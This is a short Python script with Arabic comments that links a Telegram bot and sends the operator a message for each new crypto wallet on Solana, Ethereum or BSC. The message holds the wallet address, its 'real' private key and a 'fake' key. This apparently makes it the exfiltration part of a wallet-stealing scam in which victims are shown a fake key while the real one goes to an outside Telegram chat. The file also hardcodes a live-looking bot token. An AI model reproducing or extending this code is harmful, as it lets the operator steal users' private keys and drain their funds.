import requests
import json
from datetime import datetime

TOKEN = "7656552098:AAGJSer06cf6Wc28IjcxD_spBHs2btszcIg"
CHAT_ID = None  # بنضبطه بعدين

def send_telegram_message(chat_id, text):
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    data = {"chat_id": chat_id, "text": text, "parse_mode": "HTML"}
    requests.post(url, json=data)

def notify_new_wallet(network, address, real_key, fake_key):
    if not CHAT_ID:
        return
    
    networks_emoji = {"solana": "⚡", "ethereum": "💎", "bsc": "🔷"}
    emoji = networks_emoji.get(network, "💰")
    
    message = f"""
🦅 <b>محفظة جديدة!</b>
────────────────────
🌐 الشبكة: {emoji} {network.upper()}
🏦 العنوان: <code>{address}</code>
🔑 المفتاح الحقيقي: <code>{real_key}</code>
🎭 المفتاح المزيف: <code>{fake_key}</code>
⏱️ {datetime.now().strftime('%Y-%m-%d %H:%M')}
    """
    send_telegram_message(CHAT_ID, message)

def get_updates():
    """يجيب آخر الرسائل من البوت - عشان نعرف شاتك"""
    url = f"https://api.telegram.org/bot{TOKEN}/getUpdates"
    r = requests.get(url)
    data = r.json()
    if data.get('result'):
        for update in data['result']:
            if 'message' in update:
                chat_id = update['message']['chat']['id']
                return chat_id
    return None

def save_chat_id():
    global CHAT_ID
    CHAT_ID = get_updates()
    if CHAT_ID:
        send_telegram_message(CHAT_ID, "✅ تم ربط البوت بنجاح!\n\nسأرسل لك إشعارات عند إنشاء محافظ جديدة.")

if __name__ == '__main__':
    save_chat_id()
